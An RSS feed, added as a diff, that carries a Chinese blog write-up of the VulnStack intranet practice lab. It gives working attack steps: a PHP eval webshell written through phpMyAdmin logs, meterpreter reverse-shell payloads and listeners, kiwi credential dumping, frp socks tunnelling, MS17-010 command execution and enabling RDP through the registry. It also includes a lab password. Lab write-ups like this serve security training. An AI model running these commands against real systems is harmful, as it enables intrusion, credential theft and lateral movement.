@@ -1,0 +1,252 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+    <channel>
+        <title>ATT&amp;CK on fragrant1001</title>
+        <link>https://fragrant1001.github.io/categories/attck/</link>
+        <description>Recent content in ATT&amp;CK on fragrant1001</description>
+        <generator>Hugo -- gohugo.io</generator>
+        <language>zh-Hans</language>
+        <lastBuildDate>Wed, 18 Oct 2023 17:12:23 +0800</lastBuildDate><atom:link href="https://fragrant1001.github.io/categories/attck/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>VulnStack内网靶场（一）</title>
+        <link>https://fragrant1001.github.io/post/2023/vulnstack01/</link>
+        <pubDate>Wed, 18 Oct 2023 17:12:23 +0800</pubDate>
+        
+        <guid>https://fragrant1001.github.io/post/2023/vulnstack01/</guid>
+        <description>&lt;img src="https://fragrant1001.github.io/post/2023/vulnstack01/cover.jpg" alt="Featured image of post VulnStack内网靶场（一）" /&gt;&lt;h3 id=&#34;通过web端拿shell&#34;&gt;通过web端拿shell&lt;/h3&gt;
+&lt;p&gt;phpMyadmin弱口令进去，开启general_log和配置general_log_file值,写入一句话木马.&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;SHOW VARIABLES LIKE &amp;#34;general_log%&amp;#34;;
+set global general_log = &amp;#34;ON&amp;#34;;
+set global general_log_file = &amp;#34;C:/phpStudy/WWW/a1.php&amp;#34;;
+select &amp;#39;&amp;lt;?php @eval($_POST[1]);?&amp;gt;&amp;#39;;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;hackbar测试
+&lt;img src=&#34;https://fragrant1001.github.io/post/2023/vulnstack01/image.png&#34;
+	width=&#34;1902&#34;
+	height=&#34;974&#34;
+	srcset=&#34;https://fragrant1001.github.io/post/2023/vulnstack01/image_hu7d7073c798ca50a40479808a04c60b0b_650327_480x0_resize_box_3.png 480w, https://fragrant1001.github.io/post/2023/vulnstack01/image_hu7d7073c798ca50a40479808a04c60b0b_650327_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;hackbar&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;195&#34;
+		data-flex-basis=&#34;468px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;h3 id=&#34;colbaltstrike速通&#34;&gt;ColbaltStrike速通&lt;/h3&gt;
+&lt;p&gt;建立Listeners-创建Scripted Web Delivery给到webshell去执行和返回session(失败了)&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://fragrant1001.github.io/post/2023/vulnstack01/image-1.png&#34;
+	width=&#34;1728&#34;
+	height=&#34;772&#34;
+	srcset=&#34;https://fragrant1001.github.io/post/2023/vulnstack01/image-1_hu1c2da9882db39ab17b426164c9349590_204877_480x0_resize_box_3.png 480w, https://fragrant1001.github.io/post/2023/vulnstack01/image-1_hu1c2da9882db39ab17b426164c9349590_204877_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;attack&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;223&#34;
+		data-flex-basis=&#34;537px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;上传可执行木马并执行返回session
+&lt;img src=&#34;https://fragrant1001.github.io/post/2023/vulnstack01/image-2.png&#34;
+	width=&#34;736&#34;
+	height=&#34;324&#34;
+	srcset=&#34;https://fragrant1001.github.io/post/2023/vulnstack01/image-2_hu4eea459e8727aba1bb325da76d87c139_102953_480x0_resize_box_3.png 480w, https://fragrant1001.github.io/post/2023/vulnstack01/image-2_hu4eea459e8727aba1bb325da76d87c139_102953_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;exe&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;227&#34;
+		data-flex-basis=&#34;545px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;net view看内网其它机器&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://fragrant1001.github.io/post/2023/vulnstack01/image-3.png&#34;
+	width=&#34;1470&#34;
+	height=&#34;1624&#34;
+	srcset=&#34;https://fragrant1001.github.io/post/2023/vulnstack01/image-3_hu616f617cbdb78125755f3d71f3e9684e_340969_480x0_resize_box_3.png 480w, https://fragrant1001.github.io/post/2023/vulnstack01/image-3_hu616f617cbdb78125755f3d71f3e9684e_340969_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;show targets&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;90&#34;
+		data-flex-basis=&#34;217px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;新建一个Listeners横向移动拿其它内网主机session(因为当前域控管理员账户，所以可以直接横向移动)&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://fragrant1001.github.io/post/2023/vulnstack01/image-4.png&#34;
+	width=&#34;1180&#34;
+	height=&#34;454&#34;
+	srcset=&#34;https://fragrant1001.github.io/post/2023/vulnstack01/image-4_hu281bfc6bdb3f19c8ec5c4ffebf3a05d6_145973_480x0_resize_box_3.png 480w, https://fragrant1001.github.io/post/2023/vulnstack01/image-4_hu281bfc6bdb3f19c8ec5c4ffebf3a05d6_145973_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;psexec&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;259&#34;
+		data-flex-basis=&#34;623px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://fragrant1001.github.io/post/2023/vulnstack01/image-5.png&#34;
+	width=&#34;1136&#34;
+	height=&#34;758&#34;
+	srcset=&#34;https://fragrant1001.github.io/post/2023/vulnstack01/image-5_hu92b8bc6610b2b7694b0e6cb9e49cd4cc_115144_480x0_resize_box_3.png 480w, https://fragrant1001.github.io/post/2023/vulnstack01/image-5_hu92b8bc6610b2b7694b0e6cb9e49cd4cc_115144_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;psexec2&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;149&#34;
+		data-flex-basis=&#34;359px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;看见建立连接即表示成功
+&lt;code&gt;[+] established link to child beacon:&lt;/code&gt;&lt;/p&gt;
+&lt;h3 id=&#34;metasploit折腾&#34;&gt;Metasploit折腾&lt;/h3&gt;
+&lt;p&gt;启动-使用payload生成用于反弹shell的木马&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;sudo msfdb run
+use payload/windows/x64/meterpreter/reverse_tcp
+options
+set LHOST 10.0.0.18
+set LHOST 5555
+generate -f exe -o win_5555.exe
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;方便一点的就直接用msfvenom直接生成&lt;br&gt;
+&lt;code&gt;msfvenom  -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.18 LPORT=5556 -f exe -o win_5556.exe&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;监听本地端口&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;use exploit/multi/handler
+set LHOST 10.0.0.18
+set LPORT 5555
+set payload windows/x64/meterpreter/reverse_tcp
+exploit
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;上传木马反弹会话&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://fragrant1001.github.io/post/2023/vulnstack01/image-6.png&#34;
+	width=&#34;1560&#34;
+	height=&#34;224&#34;
+	srcset=&#34;https://fragrant1001.github.io/post/2023/vulnstack01/image-6_hu05ce3ca8c437651704a52bab26db4bb2_113096_480x0_resize_box_3.png 480w, https://fragrant1001.github.io/post/2023/vulnstack01/image-6_hu05ce3ca8c437651704a52bab26db4bb2_113096_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;meterpreter&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;696&#34;
+		data-flex-basis=&#34;1671px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;加载kiwi模块抓密码&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;load kiwi
+getsystem
+creds_kerberos
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://fragrant1001.github.io/post/2023/vulnstack01/image-7.png&#34;
+	width=&#34;756&#34;
+	height=&#34;400&#34;
+	srcset=&#34;https://fragrant1001.github.io/post/2023/vulnstack01/image-7_hu2692766c7a1160f96f02662cdcbc03ae_208813_480x0_resize_box_3.png 480w, https://fragrant1001.github.io/post/2023/vulnstack01/image-7_hu2692766c7a1160f96f02662cdcbc03ae_208813_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;password&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;189&#34;
+		data-flex-basis=&#34;453px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;进Windows shell收集域信息&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;shell
+chcp 65001
+net view //域其它主机名称   \\OWA   \\ROOT-TVI862UBEH
+net time /domain //域信息owa.god.org
+net user        //用户信息
+net user /domian
+net config workstation
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;直接ping拿ip地址&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://fragrant1001.github.io/post/2023/vulnstack01/image-8.png&#34;
+	width=&#34;1008&#34;
+	height=&#34;602&#34;
+	srcset=&#34;https://fragrant1001.github.io/post/2023/vulnstack01/image-8_hue2660ad4bdd55e042d11fd3434f01947_295440_480x0_resize_box_3.png 480w, https://fragrant1001.github.io/post/2023/vulnstack01/image-8_hue2660ad4bdd55e042d11fd3434f01947_295440_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;ip&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;167&#34;
+		data-flex-basis=&#34;401px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;上传fscan扫描看看&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;.\fscan64.exe -h 192.168.52.0/24&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://fragrant1001.github.io/post/2023/vulnstack01/image-9.png&#34;
+	width=&#34;1912&#34;
+	height=&#34;1028&#34;
+	srcset=&#34;https://fragrant1001.github.io/post/2023/vulnstack01/image-9_hudad9212bc120fa8c5ed86cff38c3ad41_583734_480x0_resize_box_3.png 480w, https://fragrant1001.github.io/post/2023/vulnstack01/image-9_hudad9212bc120fa8c5ed86cff38c3ad41_583734_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;fscan&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;185&#34;
+		data-flex-basis=&#34;446px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;frp挂代理横向移动，c端上传到被攻击机器上，s端上传到vps上&lt;/p&gt;
+&lt;p&gt;frpc&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;serverAddr = &amp;#34;10.0.0.18&amp;#34;
+serverPort = 7000
+
+
+[[proxies]]
+name = &amp;#34;any&amp;#34;
+type = &amp;#34;tcp&amp;#34;
+remotePort = 6002
+[proxies.plugin]
+type = &amp;#34;socks5&amp;#34;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;frps&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;bindAddr = &amp;#34;0.0.0.0&amp;#34;
+bindPort = 7000
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;设置msf路由和代理&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;meterpreter &amp;gt; run post/multi/manage/autoroute                                                                                                             
+meterpreter &amp;gt; bg
+………………
+msf6 &amp;gt; setg Proxies socks5://127.0.0.1:6002
+msf6 &amp;gt; setg ReverseAllowProxy true
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;138机器永恒之蓝漏洞利用&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;use auxiliary/admin/smb/ms17_010_command
+set RHOSTS 192.168.52.138
+set command &amp;#34;net user&amp;#34;
+exploit
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;141机器可开启3389&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;set RHOSTS 192.168.52.141
+set command &amp;#39;REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&amp;#34; &amp;#34;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f&amp;#39;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;关闭2003的3389
+&lt;code&gt;set command &#39;REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&amp;quot; &amp;quot;Server /v fDenyTSConnections /t REG_DWORD /d 11111111 /f&#39;&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;proxychains代理连接3389&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;proxychains rdesktop 192.168.52.141 -p hongrisec@2023 -u administrator
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://fragrant1001.github.io/post/2023/vulnstack01/image-10.png&#34;
+	width=&#34;2332&#34;
+	height=&#34;836&#34;
+	srcset=&#34;https://fragrant1001.github.io/post/2023/vulnstack01/image-10_hud147a706b408b4c098e3e247ac11c354_620748_480x0_resize_box_3.png 480w, https://fragrant1001.github.io/post/2023/vulnstack01/image-10_hud147a706b408b4c098e3e247ac11c354_620748_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;2003&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;278&#34;
+		data-flex-basis=&#34;669px&#34;
+	
+&gt;&lt;/p&gt;
+</description>
+        </item>
+        
+    </channel>
+</rss>
